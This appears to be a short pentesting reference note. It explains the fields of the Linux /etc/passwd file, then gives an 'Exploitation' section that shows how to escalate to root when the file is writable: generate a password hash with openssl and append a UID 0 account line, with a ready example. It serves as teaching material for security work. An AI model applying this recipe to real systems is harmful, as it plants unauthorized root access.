# Passwd
***
/etc/passwd is a plain text file serves as a repository of system accounts. Various command utilities reference it to map user IDs to user names.

## Format
Each user on the system has one entry per line.
There are seven fields separated by colons :
- Username: Used when a user logs in, limited to 1-32 characters.
- Password:
  - An 'x' indicates an encrypted password stored in /etc/shadow.
  - Some Linux versions may still store password hashes here.
- User ID:
  - UID 0 is reserved for the root user.
  - UIDs 1-99 are reserved for other predefined accounts.
- Group ID (GID): The primary group ID (found in /etc/group).
- User ID Info: The comment field.
- Home directory:
  - The absolute path to the user's directory.
  - If the directory doesn't exist, the user's directory becomes '/'.
- Command/shell: The absolute path to a command or shell (e.g., /bin/bash)."

## Exploitation
If a regular user gains write access to the /etc/passwd file, they can exploit this access by adding a new entry following the format mentioned above. This enables them to create a new user account, specify their desired password hash, and set the UID, GID, and shell to root. To ensure a secure password, the OpenSSL tool is used.

```sh
openssl passwd -1 -salt <saltvalue> <password>
# OR
openssl passwd <password>
```

### Example
```sh
openssl passwd -1 -salt mysalt mypassword
# the output is: $1$mysalt$JyKGOJR1343sJ7N91hXVI/

# add a new user to passd
myuser:$1$mysalt$JyKGOJR1343sJ7N91hXVI/:0:0:root:/root:/bin/bash
```
